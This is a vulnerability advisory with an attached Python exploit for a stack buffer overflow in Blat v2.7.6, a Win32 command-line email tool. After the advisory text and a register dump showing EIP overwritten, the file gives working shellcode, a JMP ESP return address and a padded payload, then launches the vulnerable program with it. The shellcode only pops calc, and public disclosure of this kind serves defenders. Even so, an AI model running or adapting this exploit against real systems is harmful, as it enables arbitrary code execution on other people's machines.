@@ -1,0 +1,118 @@
+'''
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-BLAT-MAILER-BUFFER-OVERFLOW.txt
+
+
+Vendor:
+================================
+www.blat.net
+http://sourceforge.net/projects/blat/
+
+
+Product:
+================================
+Blat v2.7.6
+
+blat.exe is a Win32 command line eMail tool
+that sends eMail using SMTP or post to usenet using NNTP.
+
+
+Vulnerability Type:
+=====================
+Stack Buffer Overflow
+
+
+CVE Reference:
+==============
+N/A
+
+
+Vulnerability Details:
+=====================
+An older release of blat.exe v2.7.6 is prone to a stack based buffer
+overflow when sending
+malicious command line arguments, we need to send two arguments first
+can be whatever e.g. "AAAA"
+then second argument to trigger the buffer overflow and execute
+arbitrary code on the victims OS.
+
+
+Stack dump...
+
+
+EAX 00000826
+ECX 0018E828 ASCII "Blat saw and processed these options, and was
+confused by the last one...
+ AAAAAAA...
+EDX 0008E3C8
+EBX 000000E1
+ESP 0018F05C ASCII "AAAAA...
+EBP 41414141
+ESI 00426E88 blat.00426E88
+EDI 00272FD8
+EIP 41414141   <-------------- BOOM!
+
+C 0  ES 002B 32bit 0(FFFFFFFF)
+P 1  CS 0023 32bit 0(FFFFFFFF)
+A 0  SS 002B 32bit 0(FFFFFFFF)
+Z 1  DS 002B 32bit 0(FFFFFFFF)
+S 0  FS 0053 32bit 7EFDD000(FFF)
+T 0  GS 002B 32bit 0(FFFFFFFF)
+D 0
+O 0  LastErr ERROR_SUCCESS (00000000)
+EFL 00010246 (NO,NB,E,BE,NS,PE,GE,LE)
+
+
+Exploit code(s):
+===============
+
+Python script to exploit...
+'''
+
+import struct,os,subprocess
+
+
+#pop calc.exe Windows 7 SP1
+sc=("\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
+"\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
+"\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
+"\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
+"\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
+"\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"
+"\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC")
+
+vulnpgm="C:\\blat276\\full\\blat.exe "
+eip=struct.pack('<L', 0x776D0115)      #<--- JMP ESP kernel32.dll
+
+payload="A"*2018+eip+"\x90"*20+sc
+subprocess.Popen([vulnpgm, "A"*4, payload], shell=False)
+
+
+'''
+Disclosure Timeline:
+=========================================================
+Oct 14, 2015  : Public Disclosure
+
+
+Severity Level:
+=========================================================
+Med
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory,
+provided that it is not altered except by reformatting it, and that
+due credit is given. Permission is explicitly given for insertion in
+vulnerability databases and similar, provided that due credit is given
+to the author.
+The author is not responsible for any misuse of the information
+contained herein and prohibits any malicious use of all security
+related information or exploits by the author or elsewhere.
+
+by hyp3rlinx
+'''
